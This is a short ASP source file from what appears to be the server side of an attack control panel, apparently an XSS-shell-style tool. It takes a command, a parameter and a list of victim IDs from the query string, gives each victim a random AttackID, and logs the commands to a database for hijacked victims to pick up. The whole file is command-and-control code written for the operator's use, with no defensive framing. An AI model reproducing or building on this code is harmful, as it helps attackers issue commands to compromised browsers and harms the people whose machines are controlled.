<%
'// Save Commands

'//HISTORY
'10/08/2006
'	- Started
'01.04.2007
'	- Response showing AttackId instead of 1 in success
%>
<!--#include file="db.asp" -->
<%
	protected()

	Dim Command, Param, AttackID, VictimID	
	Command = Request.Querystring("c")
	Param = Request.Querystring("p")
	
	Dim Victims
	Victims = Split(Request.Querystring("v"), ",")

	Dim i
	Dim values(8)
	For i = 0 To Ubound(Victims)
		
		VictimID = fm_NStr(Victims(i))		
		AttackID = fm_RndNumeric2

		' Error / missing data
		If AttackID = 0 Or VictimID = 0 Then 
			Response.Write NON_ERROR
			Response.End
		End If
		
		Dim RawCommand
		RawCommand = Command & COMMAND_SEPERATOR & Param & COMMAND_SEPERATOR & AttackID

		'Log
		values(0) = "Command"
		values(1) = RawCommand
		values(2) = "text"
		values(3) = "AttackID"
		values(4) = AttackID
		values(5) = "text"
		values(6) = "VictimID"
		values(7) = VictimID
		values(8) = "number"

		fm_Insert "Log", values
	Next
	
	'Last ID (normally only using for AttackId)
	Response.Write AttackID
%>